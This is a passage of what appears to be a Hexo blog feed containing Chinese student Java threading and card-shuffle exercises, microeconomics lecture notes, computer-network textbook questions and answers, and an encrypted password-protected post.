    public String[] puke2&#x3D;new String[puke1.length];
    public String[] puke3&#x3D;new String[13];
    &#x2F;&#x2F;没排好序的牌
    public String[] puke4&#x3D;new String[53];
    &#x2F;&#x2F;计算重复的牌
    public String[] puke5&#x3D;new String[53];
    &#x2F;&#x2F;排好序的牌
    int k&#x3D;0;
    &#x2F;&#x2F;取出牌的数量

    public dapai()
    &#123;
        int count&#x3D;0;
        String[] puke&#x3D; &#123;&quot;fang&quot;,&quot;hong&quot;,&quot;mei&quot;,&quot;hei&quot;&#125;;
        int i,j,k;
        for(i&#x3D;0;i&lt;4;i++)
        &#123;
            String name&#x3D;puke[i];
            for(j&#x3D;0;j&lt;13;j++)
            &#123;
                puke1[count]&#x3D;
                        name&#x3D;puke[i]+(int)(j+1)+&quot;.jpg&quot;;
                count++;
            &#125;
        &#125;
        daluan();

    &#125;

    public void  daluan()
    &#123;
        System.arraycopy(puke1, 0, puke2, 0, puke1.length);
        int i,j,m;
        for(m&#x3D;0;m&lt;puke1.length;m++) &#123;
            i&#x3D;(int)(Math.random()*100)%52;
            j&#x3D;(int)(Math.random()*100)%52;
            String t;
            t&#x3D;puke2[i];
            puke2[i]&#x3D;puke2[j];
            puke2[j]&#x3D;t;
        &#125;
    &#125;
    public void chouqu()
    &#123;
        int i;
        for(i&#x3D;0;i&lt;13;i++)
        &#123;
            puke3[i]&#x3D;puke2[i];
            System.out.println(puke3[i]);
        &#125;

    &#125;
    public  String[] zuhe()
    &#123;
        int i;
        int j;
        int f&#x3D;1;
        int k3&#x3D;0;&#x2F;&#x2F;puke3
        int k4&#x3D;0;&#x2F;&#x2F;puke4
        for(i&#x3D;0;i&lt;13;i++)
        &#123;
            for(j&#x3D;0;j&lt;52;j++)
            &#123;
                if(puke2[i]&#x3D;&#x3D;puke4[j])
                &#123;
                    f &#x3D; 0;
                    break;
                &#125;
            &#125;
            if(f&#x3D;&#x3D;1)
            &#123;
                puke3[k3++]&#x3D;puke2[i];
                puke4[k4++]&#x3D;puke2[i];
            &#125;
            f&#x3D;1;
        &#125;
        int k&#x3D;0;
        &#x2F;&#x2F;puke5的计数
        for(i&#x3D;0;i&lt;52;i++)
        &#123;
            for(j&#x3D;0;j&lt;13;j++)
            &#123;
                if(puke1[i]&#x3D;&#x3D;puke3[j])
                &#123;
                    puke5[k++]&#x3D;puke3[j];
                &#125;
            &#125;
        &#125;
        return puke5;
    &#125;

    public static void main(String[]args)
    &#123;
        dapai da&#x3D;new dapai();
        String s1[]&#x3D;new String[13];


        s1&#x3D;da.zuhe();

        for(int i&#x3D;0;i&lt;13;i++)
            System.out.println(s1[i]);
        System.out.println(&quot;---------------------------&quot;);

    &#125;
&#125;;



<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>Java存钱与取钱</title>
    <url>/2021/01/03/Java%E5%AD%98%E9%92%B1%E4%B8%8E%E5%8F%96%E9%92%B1/</url>
    <content><![CDATA[<p>Java存钱与取钱</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">
package pukepai;

public class test1
&#123;
    public static void main(String  agrs[])
    &#123;
        Bank s1&#x3D;new Bank();
        Thread accountant,cashier;
        accountant &#x3D;new Thread(s1);
        cashier&#x3D;new Thread(s1);
        accountant.setName(&quot;accountant&quot;);
        cashier.setName(&quot;cashier&quot;);
        accountant.start();
        cashier.start();
    &#125;
&#125;
class Bank implements Runnable
&#123;
    int money;
    public Bank()
    &#123;
        money&#x3D;0;
    &#125;
    public void run()
    &#123;
        while(true)
        &#123;
            if(Thread.currentThread().getName().equals(&quot;accountant&quot;))
            &#123;
                saveOrTake(100);
            &#125;
            else if(Thread.currentThread().getName().equals(&quot;cashier&quot;))
            &#123;
                saveOrTake(100);
            &#125;
        &#125;


    &#125;
    public synchronized void saveOrTake(int amount)
    &#123;
        if(Thread.currentThread().getName().equals(&quot;accountant&quot;))
        &#123;
            money&#x3D;money+amount;
            System.out.println(&quot;会计存入&quot;+amount+&quot;万元，账上还有&quot;+money+&quot;万元&quot;);
            try
            &#123;
                Thread.sleep(800);
            &#125; catch (InterruptedException e)
            &#123;

            &#125;
        &#125;
        else if(Thread.currentThread().getName().equals(&quot;cashier&quot;))
        &#123;
            money&#x3D;money-amount;
            System.out.println(&quot;出纳取出&quot;+amount+&quot;万元，账上还有&quot;+money+&quot;万元&quot;);
            try
            &#123;
                Thread.sleep(800);
            &#125; catch (InterruptedException e)
            &#123;

            &#125;
        &#125;
    &#125;
&#125;

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>Java 老师吵到同学睡觉</title>
    <url>/2021/01/03/Java-%E8%80%81%E5%B8%88%E5%90%B5%E5%88%B0%E5%90%8C%E5%AD%A6%E7%9D%A1%E8%A7%89/</url>
    <content><![CDATA[<p>Java 老师吵到同学睡觉</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">package pukepai;

public class test1
&#123;
    public static void main(String args[])
    &#123;
        Classroom c1 &#x3D; new Classroom();
        c1.student.start();
        c1.teacher.start();
    &#125;
&#125;

class Classroom implements Runnable
&#123;
    Thread teacher, student;
    int sleepNumber&#x3D;0;
    public Classroom()
    &#123;
        teacher &#x3D; new Thread(this);
        student &#x3D; new Thread(this);
        teacher.setName(&quot;teacher&quot;);
        student.setName(&quot;student&quot;);

    &#125;

    public void run()
    &#123;
        while (true)
        &#123;
            if (Thread.currentThread() &#x3D;&#x3D; student)
            &#123;
                try
                &#123;
                    sleepNumber++;
                    System.out.println( &quot;同学：老子正在睡&quot;+&quot;第&quot;+sleepNumber+&quot;次觉&quot;);
                    Thread.sleep(1000 * 60);

                &#125; catch (InterruptedException e)
                &#123;
                    System.out.println(&quot;同学：wdnmd&quot;);
                &#125;
            &#125; else if (Thread.currentThread() &#x3D;&#x3D; teacher)
            &#123;
                System.out.println(&quot;老师：上课！！&quot;);
                try
                &#123;
                    Thread.sleep(2000);
                &#125; catch (InterruptedException e)
                &#123;

                &#125;
                student.interrupt();
            &#125;
        &#125;

    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>Java 时间显示</title>
    <url>/2021/01/03/Java-%E6%97%B6%E9%97%B4%E6%98%BE%E7%A4%BA/</url>
    <content><![CDATA[<p>Java 时间显示</p>
<a id="more"></a>

<pre class="line-numbers language-none"><code class="language-none">package pukepai;

import javax.xml.crypto.Data;
import java.lang.annotation.Target;
import java.text.SimpleDateFormat;
import java.util.Date;

public class test1
&#123;

    public static void main(String args[])
    &#123;
        TIme t1&#x3D;new TIme();
        Thread play&#x3D;new Thread(t1);
        play.start();


    &#125;
&#125;
class TIme implements Runnable
&#123;
    int time&#x3D;0;
    SimpleDateFormat m&#x3D;new SimpleDateFormat(&quot;hh:mm:ss&quot;);
    Date date;

    public void run()
    &#123;

        while(true)
        &#123;
            date&#x3D;new Date();
            System.out.println(date);
            System.out.println(m.format(date));
            System.out.println(time);
            time++;
            try
            &#123;
                Thread.sleep(200);
            &#125;
            catch (Exception e)&#123;&#125;

        &#125;
    &#125;
&#125;

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>Java猫狗共饮一泉问题</title>
    <url>/2021/01/03/Java%E7%8C%AB%E7%8B%97%E5%85%B1%E9%A5%AE%E4%B8%80%E6%B3%89%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>Java猫狗共饮一泉问题</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">package pukepai;

import java.lang.annotation.Target;

public class test1
&#123;

    public static void main(String args[])
    &#123;

        Thread dog, cat;
        Water water &#x3D; new Water(10);
        dog &#x3D; new Thread(water);
        cat &#x3D; new Thread(water);
        dog.setName(&quot;dog&quot;);
        cat.setName(&quot;cat&quot;);
        dog.start();
        cat.start();

    &#125;
&#125;

class Water implements Runnable
&#123;
    int Water;

    public Water(int waternumber)
    &#123;
        Water &#x3D; waternumber;
    &#125;

    public void run()
    &#123;
        String name &#x3D; Thread.currentThread().getName();
        while (true)
        &#123;
            if (name.equals(&quot;dog&quot;))
            &#123;
                if (Water &gt;&#x3D; 2)
                &#123;
                    System.out.println(&quot;狗喝了2口&quot;);
                    Water -&#x3D; 2;
                    System.out.println(&quot;还剩&quot; + Water + &quot;口&quot;);
                &#125; else
                &#123;
                    System.out.println(&quot;狗不够喝了，还剩&quot; + Water + &quot;口&quot;);
                    return;
                &#125;


            &#125; else if (name.equals(&quot;cat&quot;))
            &#123;
                if (Water &gt;&#x3D; 1)
                &#123;
                    System.out.println(&quot;猫喝了1口&quot;);
                    Water -&#x3D; 1;
                    System.out.println(&quot;还剩&quot; + Water + &quot;口&quot;);
                &#125; else
                &#123;
                    System.out.println(&quot;猫不够喝了，还剩&quot; + Water + &quot;口&quot;);
                    return;
                &#125;

            &#125;
            try
            &#123;
                Thread.sleep(2000);
            &#125; catch (Exception e)
            &#123;
            &#125;

        &#125;
    &#125;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>Microeconomics 微观经济学原理笔记</title>
    <url>/2020/12/28/%E7%BB%8F%E6%B5%8E%E5%AD%A6%E5%8E%9F%E7%90%86%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>圣工宏伟，乐之者察之</p>
<a id="more"></a>
<blockquote>
<p>经济学:经世济民之学</p>
</blockquote>
<blockquote>
<p>第一部分</p>
<ul>
<li>是不是科学，做可控制变量实验</li>
<li>天文学是不是科学</li>
<li>任何词语后加经济学都可以，你比如台风经济学</li>
<li>微观，宏观，计量经济学</li>
<li>微观经济学最重要，是经济学的基础</li>
<li>宏观经济学的微观基础</li>
<li>发脾气，一般对亲人，不是老板，几乎没用成本，成本收益</li>
<li>芝加哥经济学家研究，美国90年代，犯罪率下降，贫民窟生的少了</li>
<li>相扑作假，自愿交易，双赢，关键场次胜率反转，芝加哥考试，老师帮同学作弊类似</li>
<li>魔鬼经济学</li>
<li>奇观经济学</li>
</ul>
</blockquote>
<blockquote>
<p>第二部分</p>
<ul>
<li>从政治经济学到经济学</li>
<li>古典经济学也研究制度</li>
<li>到经济学资源配置研究</li>
<li>罗宾斯，人类行为科学，满足需求</li>
<li>萨缪尔森，生三胞胎，目的具体化，手段是稀缺资源</li>
<li>欲望，无限性，多样性，永远无法满足</li>
<li>资源，稀缺性，和人类的欲望有关，也就是想要多少，与存量无关</li>
<li>稀缺：同一种资源有多种用途，比如说土地，房子，种地等等</li>
<li>资源配置，比如说选课，经济学等等</li>
<li>生产可能性边界(PPF)</li>
<li>向外移动：新资源，技术进步，</li>
<li>浙江流入人口太多，GDP下降</li>
<li>MRT是指边际转换率 (Marginal rate of transformation) ，是微观经济学概念，需要和生产可能性边界 (Production Possibilities Frontier) 搭配学习</li>
<li>商店与住宅，互补，工厂与住宅，相冲突</li>
</ul>
</blockquote>
<blockquote>
<p>第三部分</p>
<ul>
<li>微观：单个经济主体</li>
<li>消费者与厂商</li>
<li>研究问题：<br>What?哪种商品应该被生产？生产多少？<br>How?怎么生产？<br>For whom?怎么分配？</li>
<li>劳动密集型：用人多<br>资本密集型：用机器多<br>会影响到分配结果</li>
<li>货币选票：买什么，买谁的，影响分配</li>
<li>收入分配问题，2000的200和20000的200，消费影响不一样</li>
<li>Micro微 Macro宏</li>
<li>宏观的界定：关税，独立货币发行权</li>
<li>经济人：利己</li>
<li>市场建立在法律基础上</li>
<li>利他，无法知道他人真实的想法</li>
<li>28% 利他  82%利己，最优</li>
<li>囚徒困境–约翰·福布斯·纳什–1994年诺贝尔奖–美丽心灵</li>
<li>学有先后，达者为师</li>
<li>私有产权的界定推动社会发展</li>
<li>付出与收入要匹配</li>
<li>流量和存量</li>
<li>内生变量和外生变量<br>内生可解出</li>
<li>经济模型</li>
<li>边际分析，增量，最后单位</li>
<li>均衡分析，局部均衡</li>
<li>有控制变量的实验</li>
<li>一般均衡理论</li>
<li>鹦鹉与经济：需求与供应</li>
<li>个别需求与市场需求</li>
<li></li>
</ul>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>计算机网络 持续更新</title>
    <url>/2020/12/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/</url>
    <content><![CDATA[<p>计算机网络 持续更新</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">P38

课后习题及答案：



1-01  计算机网络向用户可以提供那些服务？



答：连通性和共享



1-02  简述分组交换的要点。



答：（1）报文分组，加首部（2）经路由器储存转发（3）在目的地合并



1-03 试从多个方面比较电路交换、报文交换和分组交换的主要优缺点。



答：（1）电路交换：端对端通信质量因约定了通信资源获得可靠保障，对连续传送大量数据效率高。（2）报文交换：无须预约传输带宽，动态逐段利用传输带宽对突发式数据通信效率高，通信迅速。（3）分组交换：具有报文交换之高效、迅速的要点，且各分组小，路由灵活，网络生存性能好。



1-04 为什么说因特网是自印刷术以来人类通信方面最大的变革？



答：融合其他通信网络，在信息化过程中起核心作用，提供最好的连通性和信息共享，第一次提供了各种媒体形式的实时交互能力。



1-05 因特网的发展大致分为哪几个阶段？请指出这几个阶段的主要特点。



答：从单个网络APPANET向互联网发展；TCP&#x2F;IP协议的初步成型建成三级结构的Internet；分为主干网、地区网和校园网；形成多层次ISP结构的Internet；ISP首次出现。



1-06 简述因特网标准制定的几个阶段？



答：（1）因特网草案(Internet Draft) ——在这个阶段还不是 RFC 文档。（2）建议标准(Proposed Standard) ——从这个阶段开始就成为 RFC 文档。（3）因特网标准(Internet Standard)



1-07小写和大写开头的英文名internet和Internet在意思上有何重要区别？



答：（1）internet（互联网或互连网）：通用名词，它泛指由多个计算机网络互连而成的网络，协议无特指；（2）Internet（因特网）：专用名词，特指采用 TCP&#x2F;IP 协议的互联网络。区别：后者实际上是前者的双向应用



1-08 计算机网络都有哪些类别？各种类别的网络都有哪些特点？



答：按范围：（1）广域网WAN：远程、高速、是Internet的核心网。（2）城域网：城市范围，链接多个局域网。（3）局域网：校园、企业、机关、社区。（4）个域网PAN：个人电子设备



按用户：（1）公用网：面向公共营运。（2）专用网：面向特定机构。



1-09 计算机网络中的主干网和本地接入网的主要区别是什么？



答：主干网：提供远程覆盖\高速传输\和路由器最优化通信。本地接入网：主要支持用户的访问本地，实现散户接入，速率低。



1-10 试在下列条件下比较电路交换和分组交换。要传送的报文共x（bit）。从源点到终点共经过k段链路，每段链路的传播时延为d（s），数据率为b(b&#x2F;s)。在电路交换时电路的建立时间为s(s)。在分组交换时分组长度为p(bit)，且各结点的排队等待时间可忽略不计。问在怎样的条件下，分组交换的时延比电路交换的要小？（提示：画一下草图观察k段链路共有几个结点。）



答：线路交换时延：kd+x&#x2F;b+s,  分组交换时延：kd+(x&#x2F;p)*(p&#x2F;b)+ (k-1)*(p&#x2F;b)，其中(k-1)*(p&#x2F;b)表示K段传输中，有(k-1)次的储存转发延迟，当s&gt;(k-1)*(p&#x2F;b)时，电路交换的时延比分组交换的时延大，当x&gt;&gt;p,相反。



1-11在上题的分组交换网中，设报文长度和分组长度分别为x和(p+h)(bit),其中p为分组的数据部分的长度，而h为每个分组所带的控制信息固定长度，与p的大小无关。通信的两端共经过k段链路。链路的数据率为b(b&#x2F;s)，但传播时延和结点的排队时间均可忽略不计。若打算使总的时延为最小，问分组的数据部分长度p应取为多大？（提示：参考图1-12的分组交换部分，观察总的时延是由哪几部分组成。）



答：总时延D表达式，分组交换时延为：D&#x3D;kd+(x&#x2F;p)*((p+h)&#x2F;b)+ (k-1)*(p+h)&#x2F;b  D对p求导后，令其值等于0，求得p&#x3D;[(xh)&#x2F;(k-1)]^0.5



1-12 因特网的两大组成部分（边缘部分与核心部分）的特点是什么？它们的工作方式各有什么特点？



答：边缘部分：由各主机构成，用户直接进行信息处理和信息共享;低速连入核心网。核心部分：由各路由器连网，负责为边缘部分提供高速远程分组交换。



1-13 客户服务器方式与对等通信方式的主要区别是什么？有没有相同的地方？



答：前者严格区分服务和被服务者，后者无此区别。后者实际上是前者的双向应用。



1-14 计算机网络有哪些常用的性能指标？



答：速率，带宽，吞吐量，时延，时延带宽积，往返时间RTT，利用率



1-15  假定网络利用率达到了90%。试估计一下现在的网络时延是它的最小值的多少倍？



解：设网络利用率为U。，网络时延为D，网络时延最小值为D0U&#x3D;90%;D&#x3D;D0&#x2F;(1-U)----&gt;D&#x2F;D0&#x3D;10 现在的网络时延是最小值的10倍



1-16  计算机通信网有哪些非性能特征？非性能特征与性能特征有什么区别？



答：征：宏观整体评价网络的外在表现。性能指标：具体定量描述网络的技术性能。



1-17  收发两端之间的传输距离为1000km，信号在媒体上的传播速率为2×108m&#x2F;s。试计算以下两种情况的发送时延和传播时延：（1）数据长度为107bit,数据发送速率为100kb&#x2F;s。（2）数据长度为103bit,数据发送速率为1Gb&#x2F;s。



从上面的计算中可以得到什么样的结论？



解：（1）发送时延：ts&#x3D;107&#x2F;105&#x3D;100s传播时延tp&#x3D;106&#x2F;(2×108)&#x3D;0.005s（2）发送时延ts &#x3D;103&#x2F;109&#x3D;1µs传播时延：tp&#x3D;106&#x2F;(2×108)&#x3D;0.005s。结论：若数据长度大而发送速率低，则在总的时延中，发送时延往往大于传播时延。但若数据长度短而发送速率高，则传播时延就可能是总时延中的主要成分。







1-18  假设信号在媒体上的传播速度为2×108m&#x2F;s.媒体长度L分别为：（1）250px（网络接口卡）（2）100m（局域网）（3）100km（城域网）（4）5000km（广域网）；试计算出当数据率为1Mb&#x2F;s和10Gb&#x2F;s时在以上媒体中正在传播的比特数。



解：（1）1Mb&#x2F;s:传播时延&#x3D;0.1&#x2F;(2×108)&#x3D;5×10-10比特数&#x3D;5×10-10×1×106&#x3D;5×10-4 1Gb&#x2F;s: 比特数&#x3D;5×10-10×1×109&#x3D;5×10-1



（2）1Mb&#x2F;s: 传播时延&#x3D;100&#x2F;(2×108)&#x3D;5×10-7比特数&#x3D;5×10-7×1×106&#x3D;5×10-1  1Gb&#x2F;s: 比特数&#x3D;5×10-7×1×109&#x3D;5×102



（3）1Mb&#x2F;s: 传播时延&#x3D;100000&#x2F;(2×108)&#x3D;5×10-4比特数&#x3D;5×10-4×1×106&#x3D;5×1021Gb&#x2F;s: 比特数&#x3D;5×10-4×1×109&#x3D;5×105



（4）1Mb&#x2F;s: 传播时延&#x3D;5000000&#x2F;(2×108)&#x3D;2.5×10-2比特数&#x3D;2.5×10-2×1×106&#x3D;5×1041Gb&#x2F;s: 比特数&#x3D;2.5×10-2×1×109&#x3D;5×107



1-19  长度为100字节的应用层数据交给传输层传送，需加上20字节的TCP首部。再交给网络层传送，需加上20字节的IP首部。最后交给数据链路层的以太网传送，加上首部和尾部工18字节。试求数据的传输效率。数据的传输效率是指发送的应用层数据除以所发送的总数据（即应用数据加上各种首部和尾部的额外开销）。若应用层数据长度为1000字节，数据的传输效率是多少？



解：（1）100&#x2F;（100+20+20+18）&#x3D;63.3%（2）1000&#x2F;（1000+20+20+18）&#x3D;94.5%



1-20  网络体系结构为什么要采用分层次的结构？试举出一些与分层体系结构的思想相似的日常生活。答：分层的好处：①各层之间是独立的。某一层可以使用其下一层提供的服务而不需要知道服务是如何实现的。②灵活性好。当某一层发生变化时，只要其接口关系不变，则这层以上或以下的各层均不受影响。③结构上可分割开。各层可以采用最合适的技术来实现④易于实现和维护。⑤能促进标准化工作。与分层体系结构的思想相似的日常生活有邮政系统，物流系统。



1-21  协议与服务有何区别？有何关系？



答：网络协议：为进行网络中的数据交换而建立的规则、标准或约定。由以下三个要素组成：（1）语法：即数据与控制信息的结构或格式。（2）语义：即需要发出何种控制信息，完成何种动作以及做出何种响应。（3）同步：即事件实现顺序的详细说明。



协议是控制两个对等实体进行通信的规则的集合。在协议的控制下，两个对等实体间的通信使得本层能够向上一层提供服务，而要实现本层协议，还需要使用下面一层提供服务。



协议和服务的概念的区分：（1）协议的实现保证了能够向上一层提供服务。本层的服务用户只能看见服务而无法看见下面的协议。下面的协议对上面的服务用户是透明的。（2）协议是“水平的”，即协议是控制两个对等实体进行通信的规则。但服务是“垂直的”，即服务是由下层通过层间接口向上层提供的。上层使用所提供的服务必须与下层交换一些命令，这些命令在OSI中称为服务原语。



1-22  网络协议的三个要素是什么？各有什么含义？



答：网络协议：为进行网络中的数据交换而建立的规则、标准或约定。由以下三个要素组成：（1）语法：即数据与控制信息的结构或格式。（2）语义：即需要发出何种控制信息，完成何种动作以及做出何种响应。（3）同步：即事件实现顺序的详细说明。



1-23  为什么一个网络协议必须把各种不利的情况都考虑到？



答：因为网络协议如果不全面考虑不利情况，当情况发生变化时，协议就会保持理想状况，一直等下去！就如同两个朋友在电话中约会好，下午3点在公园见面，并且约定不见不散。这个协议就是很不科学的，因为任何一方如果有耽搁了而来不了，就无法通知对方，而另一方就必须一直等下去！所以看一个计算机网络是否正确，不能只看在正常情况下是否正确，而且还必须非常仔细的检查协议能否应付各种异常情况。



1-24    论述具有五层协议的网络体系结构的要点，包括各层的主要功能。



答：综合OSI 和TCP&#x2F;IP 的优点，采用一种原理体系结构。各层的主要功能：（1）物理层的任务就是透明地传送比特流。（注意：传递信息的物理媒体，如双绞线、同轴电缆、光缆等，是在物理层的下面，当做第0 层。）物理层还要确定连接电缆插头的定义及连接法。（2）数据链路层数据链路层的任务是在两个相邻结点间的线路上无差错地传送以帧（frame）为单位的数据。每一帧包括数据和必要的控制信息。（3）网络层的任务就是要选择合适的路由，使发送站的运输层所传下来的分组能够正确无误地按照地址找到目的站，并交付给目的站的运输层。（4）运输层的任务是向上一层的进行通信的两个进程之间提供一个可靠的端到端服务，使它们看不见运输层以下的数据通信的细节。（5）应用层直接为用户的应用进程提供服务。



1-25    试举出日常生活中有关“透明”这种名词的例子。



答：电视，计算机视窗操作系统、工农业产品



1-26  试解释以下名词：协议栈、实体、对等层、协议数据单元、服务访问点、客户、服务器、客户-服务器方式。  



答：（1）协议是控制两个对等实体进行通信的规则的集合。协议栈:指计算机网络体系结构采用分层模型后,每层的主要功能由对等层协议的运行来实现,因而每层可用一些主要协议来表征,几个层次画在一起很像一个栈的结构.（2）实体(entity) 表示任何可发送或接收信息的硬件或软件进程。（3）对等层:在网络体系结构中,通信双方实现同样功能的层.（4）协议数据单元:对等层实体进行信息交换的数据单位.服务访问点:在同一系统中相邻两层的实体进行交互（即交换信息）的地方.服务访问点SAP是一个抽象的概念,它实体上就是一个逻辑接口.（5）客户(client)和服务器(server)都是指通信中所涉及的两个应用进程。客户是服务的请求方，服务器是服务的提供方。（6）客户服务器方式所描述的是进程之间服务和被服务的关系。  



1-27 试解释everything over IP 和IP over everthing 的含义。



答：TCP&#x2F;IP协议可以为各式各样的应用提供服务（所谓的everything over ip）；允许IP协议在各式各样的网络构成的互联网上运行（所谓的ip over everything）
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>数据结构-排序</title>
    <url>/2020/12/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">请输入密码，密码在LHL那.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="f87261f7d991e1eaae7742d3f0e54b240a633fde3823cb75a4dda315915e5e0a">6ab5fa2f63d2e7e5b53676b86fa027f937dd92956fe5b3ba743fa9b4a913ab05172a3ec93ee9937592a57ab36d6bd5f9712f7060aec5992181dd929e0f83d4df807a6301dbfe6dbbfe80b68f6fe8fe867ea687b8481701a2452e188c6f0ece0ea6f64a4e1e9c1aa721dd0b60e119583547c677c9d7125a2b9214882c4db9798db9eb40890daab7c1059f0727f96d2fd602c298774157c9fbd68f21a6bb50a4a1d3252981270b7ff53c3d84f0e019a805ea94581df67517fe3c6a55bd346050e4ed8e08c0dfdedd994ebf77f9e0d27d760b3b3d66ce77d78d61ef9f533a1d3b22ff6fdd2b3fc84282cd94988451e49bcafb2f00b502b6b5ee3531792a3168a0e9642b7aa2b7b0f4881f743712e1a1357b926f2961306a80eec0be22207ce38951315e509a5d4a9a29de034789c0e4820a15cf22101556a2b24e2adb8762d8c1a1f516409e1d06f8ed7796e8494c3514278d6729849b755f033f5268ec65c08939a63dfa3502955c2703ec510bd815938f90eafc09ec12a5a971b3276ff60c7bc9145732ed898daff5b248e5e48a1a7768421e09b43972fc042bbdb300957f8716cf3c959b59d6b5376ff1c35b5c4a99122b8fdea5fc6663af5cc7a0a82feb98d5da6383a390e943aeb9693940f95c1843ccdeec851449879280501124f8bd19d257ed0f0f0a4b87a24f22f85b51c662bde71807679a2b343b2d6a88c49572d1a4e